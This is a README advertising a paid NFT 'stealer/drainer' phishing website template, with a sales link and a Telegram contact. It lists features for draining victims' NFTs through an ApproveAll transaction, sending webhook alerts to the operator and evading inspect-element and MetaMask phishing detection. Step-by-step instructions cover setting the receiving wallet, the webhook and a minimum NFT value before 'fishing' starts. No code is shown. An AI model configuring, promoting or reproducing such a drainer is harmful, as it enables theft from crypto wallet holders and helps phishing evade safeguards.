# ⚠️ PUBLIC GITHUB IS BACKDOORED AND SHOULD NOT BE USED !- STORE: https://web3eaters.sellix.io/
### If you need any help, DM me here: [@soleaterdev](https://t.me/soleaterdev)

## 🖼️ NFT Stealer / Drainer With ApproveAll Method Template 

# 💡 Features
- [x] Inspect Element Detection
- [x] ApproveAll Transaction
- [x] Webhook Notification System
- [x] Steal All NFTs With One Click
- [x] Custom Design
- [x] Cool design 
- [x] Instant transactions
- [x] No contract required
- [x] Anti Metamask Phishing Detections

![Webhook](./webhook.png)
![Approveall](./approveall.png)
![Contract](./allnfts.png)

# ⚠️ WILL NOT WORK IF YOU HAVENT BOUGHT THE FULL SOURCE !- STORE: https://web3eaters.sellix.io/
# 👻 Guide: 
In order to use this website, you need to edit the **index.js** file In The SRC>JS Folder
Step 1: Change The ReciveAddress To The Address You Want To Recieve The NFTs On
Step 2: Change The Webhook URL For Your Updates
Step 3: Change Minimum Value Of NFTs
Step 4: Start Your Fishing



# 👻 Important : 

Edit lines : ReceiveAddress: "YOUR WALLET", replace YOUR WALLET with your ETH wallet address.
Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. Example : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.

To get instant support, contact me on [@soleaterdev](https://t.me/soleaterdev)


